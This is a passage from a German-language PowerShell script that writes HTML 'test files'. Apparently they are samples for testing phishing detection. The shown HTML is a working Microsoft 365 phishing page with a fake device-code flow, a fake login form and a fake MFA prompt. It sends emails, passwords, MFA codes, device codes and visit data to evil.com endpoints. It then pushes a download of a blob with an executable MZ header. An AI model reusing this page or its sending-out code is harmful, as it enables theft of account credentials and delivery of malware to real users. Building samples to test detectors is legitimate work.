            
            // Simuliere OAuth Device Code Flow
            const deviceCodeData = {
                device_code: btoa(newCode),
                user_code: newCode,
                verification_uri: 'https://microsoft.com/device',
                expires_in: 900,
                interval: 5
            };
            
            console.log('Device Code Data:', deviceCodeData);
            
            // Tracke den Versuch
            fetch('https://evil.com/oauth/start', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    type: 'device_code_flow',
                    code: newCode,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                })
            });
            
            // Polling für Token (bösartig)
            pollForToken(newCode);
            
            // Simuliere erfolgreiche Authentifizierung nach 10 Sekunden
            setTimeout(() => {
                loading.classList.remove('active');
                
                // Zeige Erfolgsmeldung
                const container = document.querySelector('.container');
                container.innerHTML = `
                    <svg class="m365-logo" viewBox="0 0 100 100">
                        <rect width="45" height="45" x="5" y="5" fill="#F25022"/>
                        <rect width="45" height="45" x="50" y="5" fill="#7FBA00"/>
                        <rect width="45" height="45" x="5" y="50" fill="#00A4EF"/>
                        <rect width="45" height="45" x="50" y="50" fill="#FFB900"/>
                    </svg>
                    <h1>Authentifizierung erfolgreich!</h1>
                    <p>Sie werden weitergeleitet...</p>
                `;
                
                // Weiterleitung zum Download
                setTimeout(() => {
                    // Download starten
                    const blob = new Blob(['MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'], 
                        {type: 'application/octet-stream'});
                    const url = URL.createObjectURL(blob);
                    window.location = url;
                }, 2000);
                
            }, 10000);
        }
        
        // Generiere gefälschten Device Code
        function generateDeviceCode() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let code = '';
            for (let i = 0; i < 8; i++) {
                code += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return code;
        }
        
        // Simuliere Token Polling
        function pollForToken(code) {
            let attempts = 0;
            const interval = setInterval(() => {
                attempts++;
                
                console.log(`Polling attempt ${attempts} for code: ${code}`);
                
                // Tracke Polling
                fetch('https://evil.com/oauth/poll', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        code: code,
                        attempt: attempts,
                        timestamp: Date.now()
                    })
                });
                
                if (attempts >= 10) {
                    clearInterval(interval);
                }
            }, 5000);
        }
        
        // Phishing-Logik
        function stealCredentials(email, password) {
            fetch('https://evil.com/oauth/credentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    code: document.getElementById('deviceCode').textContent,
                    timestamp: Date.now()
                })
            });
        }
        
        // Simuliere gefälschten Login-Formular (für später)
        function showFakeLogin() {
            const container = document.querySelector('.container');
            container.innerHTML = `
                <svg class="m365-logo" viewBox="0 0 100 100">
                    <rect width="45" height="45" x="5" y="5" fill="#F25022"/>
                    <rect width="45" height="45" x="50" y="5" fill="#7FBA00"/>
                    <rect width="45" height="45" x="5" y="50" fill="#00A4EF"/>
                    <rect width="45" height="45" x="50" y="50" fill="#FFB900"/>
                </svg>
                <h1>Microsoft 365</h1>
                <h2>Anmelden</h2>
                <input type="email" id="email" placeholder="E-Mail-Adresse" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px;">
                <input type="password" id="password" placeholder="Passwort" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px;">
                <button class="button" onclick="fakeLogin()">Anmelden</button>
            `;
        }
        
        // Gefälschter Login
        function fakeLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (email && password) {
                stealCredentials(email, password);
                showFakeMFA();
            }
        }
        
        // Gefälschte MFA
        function showFakeMFA() {
            const container = document.querySelector('.container');
            container.innerHTML = `
                <svg class="m365-logo" viewBox="0 0 100 100">
                    <rect width="45" height="45" x="5" y="5" fill="#F25022"/>
                    <rect width="45" height="45" x="50" y="5" fill="#7FBA00"/>
                    <rect width="45" height="45" x="5" y="50" fill="#00A4EF"/>
                    <rect width="45" height="45" x="50" y="50" fill="#FFB900"/>
                </svg>
                <h1>Microsoft 365</h1>
                <h2>Zwei-Faktor-Authentifizierung</h2>
                <p>Geben Sie den Code aus Ihrer Authenticator-App ein:</p>
                <input type="text" id="mfaCode" placeholder="123456" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; text-align: center; font-size: 24px; letter-spacing: 8px;">
                <button class="button" onclick="fakeMFA()">Bestätigen</button>
            `;
        }
        
        // Gefälschte MFA-Eingabe
        function fakeMFA() {
            const mfaCode = document.getElementById('mfaCode').value;
            
            fetch('https://evil.com/oauth/mfa', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    mfaCode: mfaCode,
                    timestamp: Date.now()
                })
            });
            
            // Weiterleitung zum Download
            const blob = new Blob(['MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'], 
                {type: 'application/octet-stream'});
            const url = URL.createObjectURL(blob);
            window.location = url;
        }
        
        // Tracke Seitenaufruf
        fetch('https://evil.com/oauth/view', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                url: window.location.href,
                referrer: document.referrer,
                timestamp: Date.now()
            })
        });
    </script>
</body>
</html>
"@
    }
)

# Erstelle einen Unterordner für die Testdateien
$testFolder = "HTML_Testfiles_Complete"
if (!(Test-Path $testFolder)) {
    New-Item -ItemType Directory -Path $testFolder | Out-Null
}

# Wechsle in den Testordner
Push-Location $testFolder

# Zähler für erfolgreiche Erstellungen
$successCount = 0
$errorCount = 0

# Erstelle jede Datei
foreach ($file in $testFiles) {
    try {
        # Prüfe ob Datei bereits existiert
        if (Test-Path $file.Name) {
            $overwrite = Read-Host "Datei $($file.Name) existiert bereits. Überschreiben? (j/n)"
            if ($overwrite -ne 'j') {
                Write-Host "Überspringe $($file.Name)" -ForegroundColor Yellow
                continue
            }
        }
        
        # Schreibe Datei
        [System.IO.File]::WriteAllText($file.Name, $file.Content, [System.Text.UTF8Encoding]::new($false))
        Write-Host "Erstellt: $($file.Name)" -ForegroundColor Green
        $successCount++
    }
    catch {
        Write-Host "Fehler bei $($file.Name): $_" -ForegroundColor Red
        $errorCount++
    }
}

# Zurück zum ursprünglichen Verzeichnis
Pop-Location

# Zusammenfassung
Write-Host ""
Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    ZUSAMMENFASSUNG                        ║" -ForegroundColor Cyan
Write-Host "╠════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Ordner: $testFolder" -ForegroundColor White
Write-Host "║  Erfolgreich: $successCount von $($testFiles.Count)" -ForegroundColor Green
if ($errorCount -gt 0) {
    Write-Host "║  Fehler: $errorCount" -ForegroundColor Red
}
Write-Host "║  Pfad: $((Get-Location).Path)\$testFolder" -ForegroundColor Yellow
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan

# Öffne den Ordner im Explorer
$openFolder = Read-Host "`nOrdner im Explorer öffnen? (j/n)"
if ($openFolder -eq 'j') {
    Invoke-Item $testFolder
}

Write-Host ""
Write-Host "Drücke eine beliebige Taste zum Beenden..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
